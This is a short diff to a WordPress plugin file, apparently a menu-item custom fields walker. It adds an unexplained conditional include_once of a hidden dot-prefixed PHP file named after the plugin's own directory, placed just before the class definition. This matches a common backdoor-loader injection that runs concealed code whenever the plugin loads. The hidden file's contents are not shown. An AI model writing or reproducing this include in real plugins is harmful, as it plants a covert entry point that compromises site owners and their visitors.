@@ -12,6 +12,10 @@
  * @version 1.0.0
  * @author Dzikri Aziz <kvcrvt@gmail.com>
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class Menu_Item_Custom_Fields_Walker extends Walker_Nav_Menu_Edit {
 
 	/**
